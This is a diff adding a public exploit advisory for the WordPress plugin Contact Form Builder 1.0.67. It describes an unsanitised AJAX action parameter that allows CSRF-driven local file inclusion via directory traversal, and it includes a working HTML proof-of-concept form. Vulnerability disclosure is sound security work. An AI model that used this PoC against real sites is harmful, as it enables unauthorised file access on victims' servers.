@@ -1,0 +1,48 @@
+# Exploit Title: Contact Form Builder [CSRF → LFI]
+# Date: 2019-03-17
+# Exploit Author: Panagiotis Vagenas
+# Vendor Homepage: http://web-dorado.com/
+# Software Link: https://wordpress.org/plugins/contact-form-builder
+# Version: 1.0.67
+# Tested on: WordPress 5.1.1
+
+Description
+-----------
+
+Plugin implements the following AJAX actions:
+
+- `ContactFormMakerPreview`
+- `ContactFormmakerwdcaptcha`
+- `nopriv_ContactFormmakerwdcaptcha`
+- `CFMShortcode`
+
+All of them call the function `contact_form_maker_ajax`. This function
+dynamicaly loads a file defined in `$_GET['action']` or
+`$_POST['action']` if the former is not defined. Because of the way
+WordPress defines the AJAX action a user could define the plugin action
+in the `$_GET['action']` and AJAX action in `$_POST['action']`.
+Leveraging that and the fact that no sanitization is performed on the
+`$_GET['action']`, a malicious actor can perform a CSRF attack to load a
+file using directory traversal thus leading to Local File Inclusion
+vulnerability.
+
+PoC
+---
+
+```html
+<form method="post"
+action="http://wp-csrf-new.test/wp-admin/admin-ajax.php?action=/../../../../../../index">
+    <label>AJAX action:
+        <select name="action">
+                <option
+value="ContactFormMakerPreview">ContactFormMakerPreview</option>
+                <option
+value="ContactFormmakerwdcaptcha">ContactFormmakerwdcaptcha</option>
+                <option
+value="nopriv_ContactFormmakerwdcaptcha">nopriv_ContactFormmakerwdcaptcha</option>
+                <option value="CFMShortcode">CFMShortcode</option>
+        </select>
+    </label>
+    <button type="submit" value="Submit">Submit</button>
+</form>
+```
